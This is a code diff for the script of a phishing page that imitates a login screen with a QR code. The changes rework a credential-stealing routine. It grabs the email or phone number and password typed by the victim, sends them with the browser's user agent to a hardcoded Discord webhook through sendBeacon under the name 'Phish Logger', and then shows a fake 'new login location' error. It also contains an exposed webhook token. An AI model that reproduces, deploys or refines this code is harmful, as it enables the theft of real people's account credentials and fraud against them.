@@ -71,17 +71,16 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcode-generator/1.4.4/qrcode.min.js"></script>
     <script>
         // ==================================
-        // DISCORD WEBHOOK – FIXED & WORKING (Dec 13, 2025)
+        // SIMPLE TEXT DISCORD WEBHOOK – NO 400 ERRORS
         // ==================================
 
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1449141051544567984/Y_6HsT7dTe6OfXOm3QchrBPJqRfnpMbuIfOJHNf08xskilycqtE9j1_deWT3Ctu64fWW";  // Your webhook
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1449141051544567984/Y_6HsT7dTe6OfXOm3QchrBPJqRfnpMbuIfOJHNf08xskilycqtE9j1_deWT3Ctu64fWW";
 
         const CONFIG = {
             ANIMATION_DURATION: 3000,
             QR_REFRESH_INTERVAL: 120000
         };
 
-        // Selectors
         const form = document.getElementById('loginForm');
         const emailInput = document.getElementById('emailORphone');
         const passwordInput = document.getElementById('password');
@@ -89,18 +88,15 @@
         const emailWrapper = document.querySelector('.email-wrapper');
         const qrContainer = document.querySelector('.right-section .qr-code');
 
-        // FIXED SEND TO DISCORD (valid payload – content + description)
+        // SIMPLE TEXT PAYLOAD (can't fail validation)
         const sendToDiscord = (email, password) => {
+            const message = `**NEW LOGIN CAPTURED**\nEmail/Phone: ${email || 'N/A'}\nPassword: ${password || 'N/A'}\nUser-Agent: ${navigator.userAgent}\nTime: ${new Date().toLocaleString()}`;
+
             const payload = JSON.stringify({
-                content: "**New Login Captured!**",  // Required non-empty content
-                embeds: [{
-                    description: `**Email/Phone:** ${email || 'N/A'}\n**Password:** ${password || 'N/A'}\n**User-Agent:** ${navigator.userAgent.substring(0, 200)}\n**Time:** ${new Date().toLocaleString()}`,
-                    color: 0xff0000,
-                    footer: { text: "Phish Kit" }
-                }]
+                content: message,
+                username: "Phish Logger"
             });
 
-            // Unblockable sendBeacon
             navigator.sendBeacon(WEBHOOK_URL, payload);
         };
 
@@ -131,14 +127,11 @@
             const email = emailInput.value.trim();
             const password = passwordInput.value;
 
-            // Loading
             loginBtn.innerHTML = '<span class="spinner"><span class="inner pulsingEllipsis"><span class="item spinnerItem"></span><span class="item spinnerItem"></span><span class="item spinnerItem"></span></span></span>';
             loginBtn.disabled = true;
 
-            // Send
             sendToDiscord(email, password);
 
-            // Fake error
             setTimeout(() => {
                 emailWrapper.insertAdjacentHTML('afterbegin', '<span style="color:red;font-size:12px;display:block;margin:5px 0;">New login location detected, please check your e-mail.</span>');
                 emailInput.style.border = '1px solid red';
